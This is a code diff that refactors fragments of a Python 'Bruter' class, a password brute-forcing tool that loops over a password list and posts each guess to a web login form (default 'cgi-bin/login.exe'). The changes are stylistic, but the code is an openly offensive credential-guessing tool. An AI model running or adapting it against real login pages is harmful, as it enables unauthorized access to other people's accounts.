@@ -16,10 +16,7 @@ class Bruter:
     parameters = {}
 
     def __init__(self, loginUrl=None, usernameField=None, passwordField=None, parameters={}, headers={}):
-        if loginUrl:
-           self.loginUrl = loginUrl
-        else:
-            self.loginUrl = self.baseUrl + "cgi-bin/login.exe"
+        self.loginUrl = loginUrl if loginUrl else f"{self.baseUrl}cgi-bin/login.exe"
         if parameters:
             self.parameters = parameters
         if passwordField:
@@ -31,9 +28,9 @@ class Bruter:
 
 
     def startBruteforce(self):
-        print("[!] Starting brutal force on %s" % self.loginUrl)
+        print(f"[!] Starting brutal force on {self.loginUrl}")
         for password in self.passwords:
-            print("[>] Trying %s" % self.parameters)
+            print(f"[>] Trying {self.parameters}")
             self.attemptLogin(password=password)
 
     def attemptLogin(self, username=None, password=None):
@@ -56,8 +53,7 @@ class Bruter:
             response = response.read()
 
         except error.HTTPError as e:
-            print(str(e.code))
-            pass
+            print(e.code)
         response = response.decode("utf8")
         return response
 
@@ -65,13 +61,13 @@ class Bruter:
         if headers:
             self.headers.update(headers)
         parameters = parse.urlencode(self.parameters).encode("utf8")
-        request_ = request.Request(url, data=parameters, headers=self.headers, method=method)
-        return request_
+        return request.Request(
+            url, data=parameters, headers=self.headers, method=method
+        )
 
     def getUrlContent(self, url, headers={}):
         request_ = self.buildRequest(url, headers)
-        response = self.sendRequest(request_)
-        return response
+        return self.sendRequest(request_)
 
 if __name__ == '__main__':
     passwordField = "pws"
